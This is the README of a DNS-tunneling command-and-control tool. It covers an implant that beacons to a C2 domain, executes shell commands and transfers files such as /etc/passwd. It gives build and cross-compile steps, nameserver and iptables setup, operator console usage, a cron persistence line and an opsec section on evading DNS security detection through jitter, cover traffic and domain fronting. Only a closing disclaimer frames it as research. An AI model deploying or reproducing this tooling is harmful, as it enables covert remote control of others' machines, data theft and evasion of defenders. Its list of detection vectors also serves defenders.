# DNS Tunneling C2

A complete command-and-control implementation using DNS tunneling. Commands and
data are encoded into DNS queries and TXT record responses — the cockroach
protocol that survives almost any network.

```
┌─────────┐    DNS query (subdomain labels)    ┌──────────┐
│ Implant ├────────────────────────────────────▶│  C2 DNS  │
│(client) │◀────────────────────────────────────│  Server  │
└─────────┘    TXT record response              └──────────┘
```

DNS traffic on port 53 is almost never blocked or deeply inspected. This
implementation speaks enough DNS protocol to work with any standard DNS
infrastructure — or you can talk directly to the C2 server over UDP.

## Architecture

There are two components:

### `cmd/server/main.go` — The C2 DNS Server

- UDP listener on port 5353 (configurable; no root needed)
- Parses incoming DNS queries using
  [github.com/miekg/dns](https://github.com/miekg/dns)
- Extracts implant ID, status, and output from query subdomain labels
- Stores pending commands per implant
- Returns commands as TXT record payload
- Interactive operator console

### `cmd/client/main.go` — The Implant

- Beacons via DNS queries at configurable intervals
- Encodes status and command output in query subdomain labels
- Receives commands from TXT record responses
- Executes shell commands and sends output back
- Supports file upload/download
- Handles chunked data for large payloads
- Works with system DNS resolver or direct UDP

## Protocol Format

### Implant → Server (DNS Query)

```
<status>.<implant-id>.<base64-output>.c2.<domain>
```

| Component       | Description                                      |
|-----------------|--------------------------------------------------|
| `status`        | `ready` (no output), `output` (has output)       |
| `implant-id`    | Unique hex identifier (16 hex chars)             |
| `base64-output` | Base64-encoded command output (empty if none)    |
| `c2`            | Fixed routing label                              |
| `domain`        | Your C2 domain (e.g., `c2.evildomain.com`)       |

**Large Output (chunked):**

```
<status>.<implant-id>.<seq>.<total>.<base64-chunk>.c2.<domain>
```

| Component | Description                  |
|-----------|------------------------------|
| `seq`     | Chunk sequence number (1-N)  |
| `total`   | Total number of chunks       |

### Server → Implant (TXT Record Response)

The server returns a TXT record containing a base64-encoded command:

```
<base64-command>
```

For chunked commands:

```
<base64-chunk>.<seq>.<total>
```

An empty TXT record means no pending command.

## Special Commands

The implant recognizes these built-in commands (not executed as shell commands):

| Command                             | Description                              |
|-------------------------------------|------------------------------------------|
| `__INTERVAL__:<seconds>`            | Change beacon interval                   |
| `__PING__`                          | Responds with `PONG`                     |
| `__SLEEP__:<duration>`              | Sleep for a Go duration (e.g. `10s`)     |
| `__UPLOAD_START__:<path>:<size>`    | Start file upload (init)                 |
| `__UPLOAD_CHUNK__:<seq>:<tot>:<b64>`| File upload data chunk                   |
| `__UPLOAD_END__:<path>`             | Finalize file upload and write to disk   |
| `__DOWNLOAD__:<path>`               | Read file and return contents            |

## Chunking Details

DNS over UDP has a 512-byte limit without EDNS0, and 4096 bytes with EDNS0.
This implementation:

- Uses EDNS0 to support responses up to 4096 bytes
- Chunks base64 payloads at **400 bytes per label** (well under 512 to leave
  room for DNS headers, question section, and other labels)
- Sends chunked data over multiple DNS queries/responses
- Reassembles chunks server-side and client-side

### Upload Flow

```
Server                         Implant
  │   __UPLOAD_START__:/tmp/file:12345  │
  ├─────────────────────────────────────▶│  Init (creates buffer)
  │   __UPLOAD_CHUNK__:1:3:YmFzZTY0...  │
  ├─────────────────────────────────────▶│  Chunk 1/3
  │   __UPLOAD_CHUNK__:2:3:ZGF0YQo=...  │
  ├─────────────────────────────────────▶│  Chunk 2/3
  │   __UPLOAD_CHUNK__:3:3:LnNvbWU=...  │
  ├─────────────────────────────────────▶│  Chunk 3/3
  │   __UPLOAD_END__:/tmp/file          │
  ├─────────────────────────────────────▶│  Write to disk
  │                                      │
```

### Download Flow

```
Server                         Implant
  │   __DOWNLOAD__:/etc/passwd          │
  ├─────────────────────────────────────▶│  Read file
  │   DOWNLOAD_DATA:/etc/passwd:1234:... │
  ◀─────────────────────────────────────┤  (in next beacon)
```

## Build Instructions

### Prerequisites

- Go 1.21+ (tested with Go 1.26)
- `github.com/miekg/dns` (DNS protocol library)

### Build

```bash
# Clone or navigate to the project
cd c2-dns-tunnel

# Download dependencies
go mod tidy

# Build the server
go build -o bin/c2-server ./cmd/server

# Build the client (implant)
go build -o bin/c2-client ./cmd/client

# Cross-compile for different targets
GOOS=windows GOARCH=amd64 go build -o bin/c2-client.exe ./cmd/client
GOOS=linux GOARCH=arm64 go build -o bin/c2-client-arm64 ./cmd/client
GOOS=darwin GOARCH=amd64 go build -o bin/c2-client-darwin ./cmd/client
```

### Quick Start (Local Testing)

```bash
# Terminal 1: Start the C2 server on port 5353
./bin/c2-server -listen :5353 -domain c2.evildomain.com

# Terminal 2: Start the implant in direct mode
./bin/c2-client -server 127.0.0.1 -direct -id test001 -interval 5

# Or use the system resolver (if running on a real network)
./bin/c2-client -id test001 -interval 30
```

## Server Setup

### Running on Privileged Port 53

The server runs on port 5353 by default so it doesn't need root. To redirect
port 53 to 5353:

```bash
# Redirect external traffic on port 53 to port 5353
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353

# Also redirect local traffic (for local testing)
sudo iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-port 5353

# Make persistent (on Debian/Ubuntu with iptables-persistent)
sudo apt-get install iptables-persistent
sudo netfilter-persistent save
```

Alternatively, run directly on port 53 with root:

```bash
sudo ./bin/c2-server -listen :53 -domain c2.evildomain.com
```

### DNS Configuration

For the implant to resolve DNS queries through your C2 server on the internet:

1. **Register a domain** (e.g., `evildomain.com`)
2. **Create an NS record** pointing to your C2 server:
   ```
   c2.evildomain.com.  IN  NS  ns1.your-server.com.
   ```
3. **Create a glue record** (A record for the nameserver):
   ```
   ns1.your-server.com.  IN  A  <YOUR_SERVER_IP>
   ```
4. **Ensure port 53 is reachable** — your server must accept UDP traffic on
   port 53 from the internet

### Testing DNS Setup

```bash
# Test that DNS resolution works for your C2 domain
dig TXT anything.c2.evildomain.com @YOUR_SERVER_IP

# Expected: returns empty TXT record (no pending commands)
```

## Server Flags

```
Usage: c2-server [-listen :5353] [-domain c2.evildomain.com]

Environment variables:
  C2_LISTEN   — Listen address (default :5353)
  C2_DOMAIN   — C2 domain (default c2.evildomain.com)

Flags:
  -listen     Listen address (e.g., ":5353" or ":53")
  -domain     C2 domain (e.g., "c2.evildomain.com")
```

## Client Flags

```
Usage: c2-client [options]

Environment variables:
  C2_SERVER       — C2 server IP
  C2_DOMAIN       — C2 domain
  C2_IMPLANT_ID   — Implant ID (auto if empty)
  C2_INTERVAL     - Beacon interval in seconds
  C2_DIRECT       — Use direct UDP mode (1 or true)

Flags:
  -server     C2 DNS server IP (for direct mode)
  -domain     C2 domain (default: c2.evildomain.com)
  -id         Implant ID (auto-generated if empty)
  -interval   Query interval in seconds (default: 30)
  -direct     Send UDP directly to C2 server
  -resolver   Use system DNS resolver
  -config     Path to config file (JSON)
  -oneshot    Run one query and exit
```

## Operator Console

When you start the server, an interactive console opens:

```
╔══════════════════════════════════════════════╗
║      DNS Tunneling C2 — Operator Console     ║
╚══════════════════════════════════════════════╝

Available Commands:
  help, h, ?     — Show help
  list, ls       — List connected implants
  use <id>       — Select an implant
  back           — Deselect current implant
  info           — Show selected implant info
  exec <cmd>     — Execute a command on selected implant
  shell          — Interactive one-shot shell mode
  interval <sec> — Set query interval for selected implant
  upload <local> <remote> — Upload file to implant (chunked)
  download <remote>       — Download file from implant
  output         — Show pending output from selected implant
  clear, cls     — Clear screen
  exit, q        — Quit
```

### Usage Example

```
C2> ls
IMPLANT ID                     FIRST SEEN           LAST SEEN            OUTPUT
──────────────────────────────────────────────────────────────────────────────
a1b2c3d4e5f6g7h8              22:01:15 May11       22:01:15 May11

C2> use a1b2c3d4e5f6g7h8
Selected implant: a1b2c3d4e5f6g7h8

C2[a1b2c3d4e5f6g7h8]> exec whoami
Queued command for a1b2c3d4e5f6g7h8: whoami

C2[a1b2c3d4e5f6g7h8]> exec uname -a
Queued command for a1b2c3d4e5f6g7h8: uname -a

C2[a1b2c3d4e5f6g7h8]> output
=== Output for a1b2c3d4e5f6g7h8 ===
root
Linux target 6.1.0 ... x86_64 GNU/Linux
======================
```

## OpSec Notes

### Detection Vectors

DNS tunneling is detectable. Here's what defenders look for:

1. **Abnormal query volume** — A real client doesn't make DNS queries every
   5-30 seconds for a single domain
2. **Unusual record types** — TXT queries to subdomains that look like
   base64 text
3. **Abnormal domain entropy** — Subdomain labels like
   `aGVsbG8=.a1b2c3d4e5f6g7h8.c2.evildomain.com` have high entropy (random
   characters, base64) compared to normal DNS traffic
4. **Unusual packet sizes** — DNS responses containing large TXT records with
   base64 data
5. **Volume anomalies** — Large data transfers generate lots of DNS queries
6. **Unusual TLDs** — Uncommon or suspicious domains

### Detection Avoidance

1. **Query rate**: Use longer intervals (60-300 seconds) for stealth
2. **Padding**: Add random subdomains or noise queries to blend in:
   ```
   # Add padding labels to queries (future enhancement)
   random-label.c2.evildomain.com
   random-label2.c2.evildomain.com
   ```
3. **Cover traffic**: Generate legitimate-looking DNS queries alongside C2
   traffic (lookups to google.com, cloudflare.com, etc.)
4. **Use common TLDs**: Register under `.com`, `.net`, or `.org` — avoid
   suspicious TLDs
5. **Domain fronting via DNS**: Point your NS record to a CDN or use a
   legitimate-looking domain
6. **Jitter**: Add random delay (+/- 30% of interval) to avoid predictable
   beacon patterns
7. **Burst mode**: Accumulate output and send in bursts rather than every
   query cycle

### What Synthient Detects

Synthient and similar DNS security tools detect tunneling through:

- **Entropy analysis** — base64 labels have high character entropy
- **Statistical patterns** — uniform query timing vs. human/bot traffic
- **Domain graph analysis** — unusual subdomain structures
- **Response size anomalies** — oversized TXT records
- **Fingerprinting** — known C2 frameworks and tunneling tools

To minimize risk: use low query rates, add jitter, pad with noise data, and
consider HTTP/S-based fallback when DNS tunneling is detected.

### Persistence

The implant can persist via:

- **Linux**: cron jobs, systemd timers, init scripts
- **Windows**: scheduled tasks, registry Run keys, service installation
- **macOS**: launchd plists

Example cron (1-minute interval):

```bash
* * * * * /path/to/c2-client -id persistent -interval 60 -direct -server YOUR_SERVER_IP 2>/dev/null &
```

## Config File

The implant can use a JSON config file:

```json
{
  "server": "192.168.1.100",
  "domain": "c2.evildomain.com",
  "implantId": "my-persistent-id",
  "interval": 60,
  "directMode": true,
  "useResolver": false
}
```

Usage:

```bash
./c2-client -config implant-config.json
```

## License

This is a demonstration project for cybersecurity research and education.

**Use responsibly and only on systems you own or have explicit permission to
test.**
